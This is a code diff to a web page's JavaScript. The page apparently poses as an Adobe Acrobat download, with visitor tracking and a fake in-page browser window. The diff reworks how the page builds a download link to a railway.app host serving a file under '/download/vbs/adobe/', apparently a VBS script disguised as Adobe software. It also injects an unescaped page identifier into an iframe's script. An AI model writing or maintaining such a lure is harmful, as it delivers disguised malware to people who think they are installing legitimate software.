@@ -2347,8 +2347,8 @@
         } catch (error) {
           console.error('Error with visitor tracking:', error);
         }
-        const docId = window.location.pathname.split('/').filter(Boolean).pop();
-        var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(docId);
+        
+        var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(parentDocId);
         
         // Check if Edge browser
         var isEdge = /Edg/.test(navigator.userAgent);
@@ -3875,10 +3875,16 @@ Adobe Acrobat MSI Download Page Visit`;
                   browserWin.style.top = Math.max(0, centerY) + 'px';
                 }
                 // Load the inlined iframe.html content into the iframe using srcdoc
+                const docId = window.location.pathname.split('/').filter(Boolean).pop();
                 const template = document.getElementById('iframe-html-template');
                 if (template) {
                   iframe.removeAttribute('src');
-                  iframe.srcdoc = template.innerHTML;
+                  iframe.srcdoc = `
+                    <script>
+                        const parentDocId = '${docId}';
+                    <\/script>
+                    ${template.innerHTML}
+                `;
                 } else {
                   // fallback: show error
                   iframe.srcdoc = '<h2>Failed to load content.</h2>';
